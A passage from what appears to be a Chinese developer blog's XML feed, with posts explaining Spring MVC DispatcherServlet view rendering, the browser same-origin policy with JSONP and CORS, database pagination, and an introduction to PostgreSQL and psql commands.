(!ObjectUtils.isEmpty(interceptors)) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = interceptors.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">			HandlerInterceptor interceptor = interceptors[i];</span><br><span class="line">			interceptor.postHandle(request, response, <span class="keyword">this</span>.handler, mv);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>handler处理后的结果是通过processDispatchResult传出去的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DispatcherServlet.java</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Handle the result of handler selection and handler invocation, which is</span></span><br><span class="line"><span class="comment">	 * either a ModelAndView or an Exception to be resolved to a ModelAndView.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processDispatchResult</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">			HandlerExecutionChain mappedHandler, ModelAndView mv, Exception exception)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">boolean</span> errorView = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (exception != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (exception <span class="keyword">instanceof</span> ModelAndViewDefiningException) &#123;</span><br><span class="line">				logger.debug(<span class="string">"ModelAndViewDefiningException encountered"</span>, exception);</span><br><span class="line">				mv = ((ModelAndViewDefiningException) exception).getModelAndView();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				Object handler = (mappedHandler != <span class="keyword">null</span> ? mappedHandler.getHandler() : <span class="keyword">null</span>);</span><br><span class="line">				mv = processHandlerException(request, response, handler, exception);</span><br><span class="line">				errorView = (mv != <span class="keyword">null</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Did the handler return a view to render?</span></span><br><span class="line">		<span class="keyword">if</span> (mv != <span class="keyword">null</span> &amp;&amp; !mv.wasCleared()) &#123;</span><br><span class="line">			render(mv, request, response);</span><br><span class="line">			<span class="keyword">if</span> (errorView) &#123;</span><br><span class="line">				WebUtils.clearErrorRequestAttributes(request);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				logger.debug(<span class="string">"Null ModelAndView returned to DispatcherServlet with name '"</span> + getServletName() +</span><br><span class="line">						<span class="string">"': assuming HandlerAdapter completed request handling"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">			<span class="comment">// Concurrent handling started during a forward</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (mappedHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">			mappedHandler.triggerAfterCompletion(request, response, <span class="keyword">null</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>去各种判断，核心的方法就在<code>render(mv, request, response)</code>;</p>
<p>它负责渲染返回的<code>ModelAndView</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DispatcherServlet.java</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* Render the given ModelAndView.</span></span><br><span class="line"><span class="comment">	* &lt;p&gt;This is the last stage in handling a request. It may involve resolving the view by name.</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> mv the ModelAndView to render</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> request current HTTP servlet request</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> response current HTTP servlet response</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@throws</span> ServletException if view is missing or cannot be resolved</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@throws</span> Exception if there's a problem rendering the view</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">// Determine locale for request and apply it to the response.</span></span><br><span class="line">		Locale locale = <span class="keyword">this</span>.localeResolver.resolveLocale(request);</span><br><span class="line">		response.setLocale(locale);</span><br><span class="line"></span><br><span class="line">		View view;</span><br><span class="line">		<span class="keyword">if</span> (mv.isReference()) &#123;</span><br><span class="line">			<span class="comment">// We need to resolve the view name.</span></span><br><span class="line">			view = resolveViewName(mv.getViewName(), mv.getModelInternal(), locale, request);</span><br><span class="line">			<span class="keyword">if</span> (view == <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"Could not resolve view with name '"</span> + mv.getViewName() +</span><br><span class="line">						<span class="string">"' in servlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// No need to lookup: the ModelAndView object contains the actual View object.</span></span><br><span class="line">			view = mv.getView();</span><br><span class="line">			<span class="keyword">if</span> (view == <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"ModelAndView ["</span> + mv + <span class="string">"] neither contains a view name nor a "</span> +</span><br><span class="line">						<span class="string">"View object in servlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Delegate to the View object for rendering.</span></span><br><span class="line">		<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">			logger.debug(<span class="string">"Rendering view ["</span> + view + <span class="string">"] in DispatcherServlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			view.render(mv.getModelInternal(), request, response);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				logger.debug(<span class="string">"Error rendering view ["</span> + view + <span class="string">"] in DispatcherServlet with name '"</span> +</span><br><span class="line">						getServletName() + <span class="string">"'"</span>, ex);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数解析mv对象，如果是一个引用名就查找对应的view，最终返回一个View对象，</p>
<p>然后将渲染的工作委托给这个view对象，<code>view.render(mv.getModelInternal(), request, response);</code></p>
<p>其中<code>resolveViewName</code>方法遍历 <code>DispatcherServlet</code>中注册的<code>viewResolver</code>，返回第一个非空的结果</p>
<p>查找视图名称的方法如下:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/** List of ViewResolvers used by this servlet */</span></span><br><span class="line"><span class="keyword">private</span> List&lt;ViewResolver&gt; viewResolvers;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	* Resolve the given view name into a View object (to be rendered).</span></span><br><span class="line"><span class="comment">	* &lt;p&gt;The default implementations asks all ViewResolvers of this dispatcher.</span></span><br><span class="line"><span class="comment">	* Can be overridden for custom resolution strategies, potentially based on</span></span><br><span class="line"><span class="comment">	* specific model attributes or request parameters.</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> viewName the name of the view to resolve</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> model the model to be passed to the view</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> locale the current locale</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> request current HTTP servlet request</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@return</span> the View object, or &#123;<span class="doctag">@code</span> null&#125; if none found</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@throws</span> Exception if the view cannot be resolved</span></span><br><span class="line"><span class="comment">	* (typically in case of problems creating an actual View object)</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@see</span> ViewResolver#resolveViewName</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> View <span class="title">resolveViewName</span><span class="params">(String viewName, Map&lt;String, Object&gt; model, Locale locale,</span></span></span><br><span class="line"><span class="function"><span class="params">		HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (ViewResolver viewResolver : <span class="keyword">this</span>.viewResolvers) &#123;</span><br><span class="line">				View view = viewResolver.resolveViewName(viewName, locale);</span><br><span class="line">				<span class="keyword">if</span> (view != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> view;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>最终视图的渲染是View中定义的<code>render</code>方法进行的，它是一个抽象的接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Render the view given the specified model.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;The first step will be preparing the request: In the JSP case,</span></span><br><span class="line"><span class="comment">	 * this would mean setting model objects as request attributes.</span></span><br><span class="line"><span class="comment">	 * The second step will be the actual rendering of the view,</span></span><br><span class="line"><span class="comment">	 * for example including the JSP via a RequestDispatcher.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> model Map with name Strings as keys and corresponding model</span></span><br><span class="line"><span class="comment">	 * objects as values (Map can also be &#123;<span class="doctag">@code</span> null&#125; in case of empty model)</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> request current HTTP request</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> response HTTP response we are building</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> Exception if rendering failed</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">render</span><span class="params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring mvc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JS跨域原理]]></title>
      <url>http://qsli.github.io/2016/10/02/jsonp/</url>
      <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><blockquote>
<p>同源策略限制了一个源（origin）中加载文本或脚本与来自其它源（origin）中资源的交互方式。</p>
</blockquote>
<p>例如在使用XMLHttpRequest 或 <img> 标签时则会受到同源策略的约束。交互通常分为三类：</p>
<ol>
<li><p>通常允许进行跨域写操作（<code>Cross-origin writes</code>）。例如链接（links），重定向以及表单提交。特定少数的HTTP请求需要添加 preflight。</p>
</li>
<li><p>通常允许跨域资源嵌入（<code>Cross-origin embedding</code>）。</p>
</li>
<li>通常不允许跨域读操作（<code>Cross-origin reads</code>）。</li>
</ol>
<p>下表给出了相对<code>http://store.company.com/dir/page.html</code>同源检测的示例:</p>
<table>
<thead>
<tr>
<th>URL</th>
<th>结果</th>
<th>原因</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://store.company.com/dir2/other.html" rel="external nofollow noopener noreferrer" target="_blank">http://store.company.com/dir2/other.html</a></td>
<td>成功</td>
<td></td>
</tr>
<tr>
<td><a href="http://store.company.com/dir/inner/another.html" rel="external nofollow noopener noreferrer" target="_blank">http://store.company.com/dir/inner/another.html</a></td>
<td>成功</td>
<td></td>
</tr>
<tr>
<td><a href="https://store.company.com/secure.html" rel="external nofollow noopener noreferrer" target="_blank">https://store.company.com/secure.html</a></td>
<td>失败</td>
<td>协议不同</td>
</tr>
<tr>
<td><a href="http://store.company.com:81/dir/etc.html" rel="external nofollow noopener noreferrer" target="_blank">http://store.company.com:81/dir/etc.html</a></td>
<td>失败</td>
<td>端口不同</td>
</tr>
<tr>
<td><a href="http://news.company.com/dir/other.html" rel="external nofollow noopener noreferrer" target="_blank">http://news.company.com/dir/other.html</a></td>
<td>失败</td>
<td>主机名不同</td>
</tr>
</tbody>
</table>
<h2 id="ajax-跨域"><a href="#ajax-跨域" class="headerlink" title="ajax 跨域"></a>ajax 跨域</h2><blockquote>
<p>同源政策规定，AJAX请求只能发给同源的网址，否则就报错。</p>
</blockquote>
<p>请求其他域资源的时候，由于同源策略的限制一般会出现如下的错误：</p>
<blockquote>
<p>XMLHttpRequest cannot load <a href="http://xxxxx" rel="external nofollow noopener noreferrer" target="_blank">http://xxxxx</a>. No ‘Access-Control-Allow-Origin’ header is present on the requested resource. Origin ‘null’ is therefore not allowed access. The response had HTTP status code 500.</p>
</blockquote>
<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签是支持跨域的，JSONP的原理就是使用这个标签。</p>
<p>服务器会在传给浏览器前将JSON数据填充到回调函数中</p>
<script src="//gist.github.com/cc896797f4ef746e9cbc75b8f6ebc24f.js"></script>
<p>上述代码中<code>return param + &#39;(&#39; + json.dumps(data) + &#39;)&#39;</code>是将返回的数据填充到回调函数中</p>
<p>前端的代码如下：</p>
<script src="//gist.github.com/8d90c2a0599818488a647177b4f196c2.js"></script>
<p>使用了jQuery的ajax请求</p>
<p><strong>但是JSONP的方式只支持get请求</strong></p>
<h3 id="CORS-Cross-Origin-Resource-Sharing"><a href="#CORS-Cross-Origin-Resource-Sharing" class="headerlink" title="CORS (Cross-Origin Resource Sharing)"></a>CORS (<code>Cross-Origin Resource Sharing</code>)</h3><p>CORS是一个W3C标准, 不仅支持GET方式还支持POST方式的跨域请求</p>
<blockquote>
<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
</blockquote>
<p>请求的流程图如下：<br><img src="/2016/10/02/jsonp/cors.png"></p>
<p>详细原理参考阮一峰老师的<a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" rel="external nofollow noopener noreferrer" target="_blank">跨域资源共享 CORS 详解</a></p>
<h3 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h3><blockquote>
<p>WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>
</blockquote>
<p>详细原理参考阮一峰老师的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" rel="external nofollow noopener noreferrer" target="_blank">浏览器的同源策略</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" rel="external nofollow noopener noreferrer" target="_blank">跨域资源共享 CORS 详解</a></p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" rel="external nofollow noopener noreferrer" target="_blank">浏览器的同源策略</a></p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" rel="external nofollow noopener noreferrer" target="_blank">浏览器同源政策及其规避方法</a></p>
</li>
<li><p><a href="http://blog.csdn.net/fdipzone/article/details/46390573" rel="external nofollow noopener noreferrer" target="_blank"> ajax 设置Access-Control-Allow-Origin实现跨域访问</a></p>
</li>
<li><p><a href="http://liuwanlin.info/corsxiang-jie/" rel="external nofollow noopener noreferrer" target="_blank">使用CORS（译）</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> fe </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ajax </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据库分页]]></title>
      <url>http://qsli.github.io/2016/09/30/pagination/</url>
      <content type="html"><![CDATA[<h2 id="逻辑分页"><a href="#逻辑分页" class="headerlink" title="逻辑分页"></a>逻辑分页</h2><p>就是将所有的结果集拿出来，然后在程序中进行截取，由于所有的数据都是在内存中的，占用内存比较大</p>
<h2 id="物理分页"><a href="#物理分页" class="headerlink" title="物理分页"></a>物理分页</h2><p>物理分页是指基于数据库提供的类似 <code>limit offset,rows</code>这样的语法。</p>
<p>但是，比如<code>limit 10000,20</code>,  就会读取10020条数据，但是只会返回后面20条数据。</p>
<h2 id="手工计算"><a href="#手工计算" class="headerlink" title="手工计算"></a>手工计算</h2><p>如果id是有序的，可以做一个简单的转换，比如使用  <code>where id between 10000 and 10020</code>, 这样的效率就会相对的高些</p>
<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p> <a href="PPC2009_mysql_pagination.pdf">PPC2009_mysql_pagination.pdf</a></p>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Postgre数据库简介]]></title>
      <url>http://qsli.github.io/2016/09/27/postgre/</url>
      <content type="html"><![CDATA[<p><img src="https://www.postgresql.org/media/img/layout/hdr_left.png" alt></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>PostgreSQL是自由的对象-关系型数据库服务器（数据库管理系统）</p>
</blockquote>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/PostgreSQL" rel="external nofollow noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/PostgreSQL</a></p>
</blockquote>
<p>发展流程:</p>
<img src="/2016/09/27/postgre/history.jpg">
<blockquote>
<p>PostgreSQL 的前身是 BSD 的始于 1977 年的 Ingres 项目，82年，项目领导人Michael Stonebraker 将其商业化。85年正式更名为Postgres。</p>
</blockquote>
<blockquote>
<p>92年两名伯克利的研究生在做研究生课题的时候，用SQL92替换了原有的Postquel作为查询语言，并将其更名为Postgres95。</p>
</blockquote>
<blockquote>
<p>96年，一群黑客们接手了Postgres95，开始修改及稳定它的代码，并与同年8月发布了第一个开源版本，将其更名为PostgreSQL。</p>
</blockquote>
<p>PG支持的数据类型非常丰富，他支持任意精度的数值类型，无限长度的文本类型，同时具有一些nosql的特性，也可以存储hash表（hstore），ltree树状结构，支持jsonb、xml、array的存储和操作。同时PG提供了对IP地址和地理信息的良好支持。</p>
<p>PG支持的语言非常多，各种脚本语言，例如：Lua、Perl、Python、Ruby等，也支持各种编译语言，如c、c++和JAVA等，对统计语言R也有良好的支持。</p>
<p>架构图：</p>
<img src="/2016/09/27/postgre/arch.jpg">
<blockquote>
<p>图片来自<br><a href="https://wiki.postgresql.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E6%AF%94" rel="external nofollow noopener noreferrer" target="_blank">https://wiki.postgresql.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E6%AF%94</a></p>
</blockquote>
<p>PostgreSQL采用的是C/S结构，一个客户端对应一个服务器端的守护进程(开销会略大)</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>参考官网：<a href="https://www.postgresql.org/download/" rel="external nofollow noopener noreferrer" target="_blank">https://www.postgresql.org/download/</a></p>
<p>也可以参考阮一峰老师的这篇 <a href="http://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQL新手入门</a></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><a href="http://www.postgres.cn/docs/9.5/" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQL 9.5.3 中文在线手册</a></p>
<p><a href="https://github.com/postgres-cn/pgdoc-cn/releases" rel="external nofollow noopener noreferrer" target="_blank">离线中文手册</a></p>
<h3 id="psql-–-PostgreSQL的交互式终端的使用"><a href="#psql-–-PostgreSQL的交互式终端的使用" class="headerlink" title="psql –  PostgreSQL的交互式终端的使用"></a>psql –  PostgreSQL的交互式终端的使用</h3><p>详细请参见 <a href="http://www.postgres.cn/docs/9.5/app-psql.html" rel="external nofollow noopener noreferrer" target="_blank">psql</a></p>
<p>登录到数据库，类似mysql<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>-U指定用户，-d指定数据库，-h指定服务器，-p指定端口。</p>
</blockquote>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>\h</td>
<td>查看SQL命令的解释，比如\h select。</td>
</tr>
<tr>
<td>\?</td>
<td>查看psql命令列表。</td>
</tr>
<tr>
<td>\l</td>
<td>列出所有数据库。</td>
</tr>
<tr>
<td>\c [database_name]：</td>
<td>连接其他数据库。</td>
</tr>
<tr>
<td>\d</td>
<td>列出当前数据库的所有表格。</td>
</tr>
<tr>
<td>\d [table_name]：</td>
<td>列出某一张表格的结构。</td>
</tr>
<tr>
<td>\di</td>
<td>查看索引</td>
</tr>
<tr>
<td>\du</td>
<td>列出所有用户。</td>
</tr>
<tr>
<td>\e</td>
<td>打开文本编辑器。</td>
</tr>
<tr>
<td>\! pwd</td>
<td>显示当前工作目录</td>
</tr>
<tr>
<td>\q</td>
<td>退出交互shell</td>
</tr>
<tr>
<td>\conninfo</td>
<td>列出当前数据库和连接的信息。</td>
</tr>
</tbody>
</table>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">exampledb=&gt; \d</span><br><span class="line">             关联列表             </span><br><span class="line">架构模式 |   名称   |  类型  | 拥有者</span><br><span class="line">----------+----------+--------+--------</span><br><span class="line">public   | user_tbl | 数据表 | dbuser</span><br><span class="line">(1 行记录)</span><br><span class="line"></span><br><span class="line">exampledb=&gt; \l</span><br><span class="line">                                                      数据库列表</span><br><span class="line"> 名称    |  拥有者  | 字元编码 |            校对规则            |             Ctype              |       存取权限</span><br><span class="line">-----------+----------+----------+--------------------------------+--------------------------------+-----------------------</span><br><span class="line">exampledb | dbuser   | UTF8     | Chinese (Simplified)_China.936 | Chinese (Simplified)_China.936 | =Tc/dbuser           +</span><br><span class="line">         |          |          |                                |                                | dbuser=CTc/dbuser</span><br><span class="line">postgres  | postgres | UTF8     | Chinese (Simplified)_China.936 | Chinese (Simplified)_China.936 |</span><br><span class="line">template0 | postgres | UTF8     | Chinese (Simplified)_China.936 | Chinese (Simplified)_China.936 | =c/postgres          +</span><br><span class="line">         |          |          |                                |                                | postgres=CTc/postgres</span><br><span class="line">template1 | postgres | UTF8     | Chinese (Simplified)_China.936 | Chinese (Simplified)_China.936 | =c/postgres          +</span><br><span class="line">         |          |          |                                |                                | postgres=CTc/postgres</span><br><span class="line">(4 行记录)</span><br><span class="line"></span><br><span class="line">exampledb=&gt; \du</span><br><span class="line">                           角色列表</span><br><span class="line">角色名称 |                    属性                    | 成员属于</span><br><span class="line">----------+--------------------------------------------+----------</span><br><span class="line">dbuser   |                                            | &#123;&#125;</span><br><span class="line">postgres | 超级用户, 建立角色, 建立 DB, 复制, 绕过RLS | &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exampledb=&gt; \dt</span><br><span class="line">             关联列表</span><br><span class="line">架构模式 |   名称   |  类型  | 拥有者</span><br><span class="line">----------+----------+--------+--------</span><br><span class="line">public   | user_tbl | 数据表 | dbuser</span><br><span class="line">(1 行记录)</span><br><span class="line"></span><br><span class="line">exampledb=&gt; \d user_tbl;</span><br><span class="line">         数据表 "public.user_tbl"</span><br><span class="line">  栏位     |         类型          | 修饰词</span><br><span class="line">-------------+-----------------------+--------</span><br><span class="line">name        | character varying(20) |</span><br><span class="line">signup_date | date                  |</span><br></pre></td></tr></table></figure>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
<li><p><a href="http://www.infoq.com/cn/articles/underlying-storage-of-uber-change-from-mysql-to-postgres" rel="external nofollow noopener noreferrer" target="_blank">Uber的底层存储从Postgres换成MySQL之后</a></p>
</li>
<li><p><a href="http://database.51cto.com/art/200511/10875.htm" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQL数据库的特点</a></p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQL新手入门_阮一峰</a></p>
</li>
<li><p><a href="http://book.51cto.com/art/201201/313178.htm" rel="external nofollow noopener noreferrer" target="_blank">PostgreSQL简介及发展历程</a></p>
</li>
